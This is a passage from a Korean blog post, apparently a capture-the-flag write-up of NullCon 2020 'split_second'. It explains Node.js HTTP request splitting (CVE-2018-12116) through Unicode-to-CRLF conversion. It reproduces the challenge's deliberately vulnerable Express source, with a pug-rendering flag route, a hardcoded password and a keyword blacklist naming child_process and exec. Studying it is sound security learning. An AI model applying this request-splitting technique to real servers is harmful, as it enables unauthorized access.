{"componentChunkName":"component---src-templates-blog-post-js","path":"/Security/nodejs-HTTP-request-splitting을-이용한-SSRF-취약점featNullCon2020-splitsecond-WriteUp/","result":{"data":{"site":{"siteMetadata":{"author":"JaeSeoKim","comment":{"utterances":"JaeSeoKim/jaeseokim.github.io"},"sponsor":{"buyMeACoffeeId":"jaeseokim"}}},"markdownRemark":{"excerpt":"이번에 TeamMODU에서 다른 형이 발표한 NullCon2020-splitsecond 문제의 WriteUp를 보며 신기하고 재미있어 보여서 한번 공부를 해봤습니다. CVE-2018-12116 대상 : Node.js: All versions prior to Node.js 6.15.0 and 8.14.0 위협 : HTTP request splitting N…","html":"<p>이번에 TeamMODU에서 다른 형이 발표한 <strong><a href=\"https://github.com/nullcon/hackim-2020/tree/master/web/split_second\">NullCon<em>2020-split</em>second</a></strong> 문제의 WriteUp를 보며 신기하고 재미있어 보여서 한번 공부를 해봤습니다.</p>\n<blockquote>\n<h2 id=\"cve-2018-12116\" style=\"position:relative;\"><a href=\"#cve-2018-12116\" aria-label=\"cve 2018 12116 permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://www.cvedetails.com/cve/CVE-2018-12116/\">CVE-2018-12116</a></h2>\n<p>대상 : Node.js: All versions prior to Node.js 6.15.0 and 8.14.0</p>\n<p>위협 : HTTP request splitting</p>\n<p>Node.Js가 정상적이지 않은 유니코드 데이터를 path 옵션으로 HTTP request을 받아들이면 그 데이터는 다른 데이터로 변환되어 작동하게 됩니다. 이점을 이용하여 HTTP request split이 실행 됩니다.</p>\n<p>ex)</p>\n<p>\\u{01F436} = 🐶 | server -> \\x36 = 6</p>\n<p>\\u{010D} = č | server -> \\x0d = \\r</p>\n<p>\\u{010A} = Ċ | server -> \\x0a = \\n</p>\n</blockquote>\n<p>일단 취약점의 정보는 간단하게 위의 내용과 같습니다. 이러한 취약점이 어떻게 작동하는지 <strong><a href=\"https://github.com/nullcon/hackim-2020/tree/master/web/split_second\">NullCon<em>2020-split</em>second</a></strong> 문제를 예제로 설명 하겠습니다.</p>\n<p><strong><a href=\"https://github.com/nullcon/hackim-2020/tree/master/web/split_second\">NullCon<em>2020-split</em>second</a></strong></p>\n<h2 id=\"--writeup\" style=\"position:relative;\"><a href=\"#--writeup\" aria-label=\"  writeup permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>- WriteUp</h2>\n<p>문제를 보면 일단 dirburster를 이용하여 탐색을 합니다.</p>\n<p>탐색 된 목록//source/getMeme/flag/core</p>\n<p>이때 /source에 접근을 하게 되면 소스에 대해 노출을 해줍니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"js\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\">//node 8.12.0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">express</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">require</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;express&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">app</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">express</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">fs</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">require</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;fs&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">path</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">require</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;path&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">http</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">require</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;http&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">pug</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">require</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;pug&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">sendFile</span><span class=\"mtk1\">(</span><span class=\"mtk4\">path</span><span class=\"mtk1\">.</span><span class=\"mtk3\">join</span><span class=\"mtk1\">(</span><span class=\"mtk4\">__dirname</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;/index.html&quot;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/source&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">sendFile</span><span class=\"mtk1\">(</span><span class=\"mtk4\">path</span><span class=\"mtk1\">.</span><span class=\"mtk3\">join</span><span class=\"mtk1\">(</span><span class=\"mtk4\">__dirname</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;/source.html&quot;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/getMeme&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&#39;&lt;iframe src=&quot;https://giphy.com/embed/LLHkw7UnvY3Kw&quot; width=&quot;480&quot; height=&quot;480&quot; frameBorder=&quot;0&quot; class=&quot;giphy-embed&quot; allowFullScreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href=&quot;https://giphy.com/gifs/kid-dances-jumbotron-LLHkw7UnvY3Kw&quot;&gt;via GIPHY&lt;/a&gt;&lt;/p&gt;&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/flag&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">ip</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">req</span><span class=\"mtk1\">.</span><span class=\"mtk4\">connection</span><span class=\"mtk1\">.</span><span class=\"mtk4\">remoteAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">ip</span><span class=\"mtk1\">.</span><span class=\"mtk3\">includes</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;127.0.0.1&quot;</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">authheader</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">req</span><span class=\"mtk1\">.</span><span class=\"mtk4\">headers</span><span class=\"mtk1\">[</span><span class=\"mtk6\">&quot;adminauth&quot;</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">pug2</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">decodeURI</span><span class=\"mtk1\">(</span><span class=\"mtk4\">req</span><span class=\"mtk1\">.</span><span class=\"mtk4\">headers</span><span class=\"mtk1\">[</span><span class=\"mtk6\">&quot;pug&quot;</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">x</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">pug2</span><span class=\"mtk1\">.</span><span class=\"mtk3\">match</span><span class=\"mtk1\">(</span><span class=\"mtk6\">/</span><span class=\"mtk7\">[a-z]</span><span class=\"mtk6\">/</span><span class=\"mtk10\">g</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk8\">!</span><span class=\"mtk4\">x</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">authheader</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;secretpassword&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">html</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">pug</span><span class=\"mtk1\">.</span><span class=\"mtk3\">render</span><span class=\"mtk1\">(</span><span class=\"mtk4\">pug2</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;No characters&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;You need to come from localhost&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/core&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">q</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">req</span><span class=\"mtk1\">.</span><span class=\"mtk4\">query</span><span class=\"mtk1\">.</span><span class=\"mtk4\">q</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">resp</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">q</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">url</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;http://localhost:8081/getMeme?&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk4\">q</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">console</span><span class=\"mtk1\">.</span><span class=\"mtk3\">log</span><span class=\"mtk1\">(</span><span class=\"mtk4\">url</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">trigger</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">blacklist</span><span class=\"mtk1\">(</span><span class=\"mtk4\">url</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">trigger</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk7\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;&lt;p&gt;Errrrr, You have been Blocked&lt;/p&gt;&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">try</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">http</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk4\">url</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">resp</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk4\">resp</span><span class=\"mtk1\">.</span><span class=\"mtk3\">setEncoding</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;utf8&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk4\">resp</span><span class=\"mtk1\">.</span><span class=\"mtk3\">on</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;error&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">err</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">err</span><span class=\"mtk1\">.</span><span class=\"mtk4\">code</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;ECONNRESET&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk11\">console</span><span class=\"mtk1\">.</span><span class=\"mtk3\">log</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;Timeout occurs&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk10\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk4\">resp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk3\">on</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;data&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">chunk</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk4\">resps</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">chunk</span><span class=\"mtk1\">.</span><span class=\"mtk3\">toString</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk4\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk4\">resps</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk3\">on</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;error&quot;</span><span class=\"mtk1\">, (</span><span class=\"mtk4 mtki\">e</span><span class=\"mtk1\">) </span><span class=\"mtk10\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk4\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk4\">e</span><span class=\"mtk1\">.</span><span class=\"mtk4\">message</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      } </span><span class=\"mtk10\">catch</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">error</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">console</span><span class=\"mtk1\">.</span><span class=\"mtk3\">log</span><span class=\"mtk1\">(</span><span class=\"mtk4\">error</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;search param &#39;q&#39; missing!&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk3\">blacklist</span><span class=\"mtk1\">(</span><span class=\"mtk4 mtki\">url</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">evilwords</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;global&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;process&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;mainModule&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;require&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;root&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;child_process&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;exec&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&#39;&quot;&#39;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;&#39;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;!&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">arrayLen</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">evilwords</span><span class=\"mtk1\">.</span><span class=\"mtk4\">length</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk4\">i</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&lt;</span><span class=\"mtk1\"> </span><span class=\"mtk4\">arrayLen</span><span class=\"mtk1\">; </span><span class=\"mtk4\">i</span><span class=\"mtk8\">++</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">const</span><span class=\"mtk1\"> </span><span class=\"mtk11\">trigger</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">url</span><span class=\"mtk1\">.</span><span class=\"mtk3\">includes</span><span class=\"mtk1\">(</span><span class=\"mtk4\">evilwords</span><span class=\"mtk1\">[</span><span class=\"mtk4\">i</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">trigger</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk7\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span 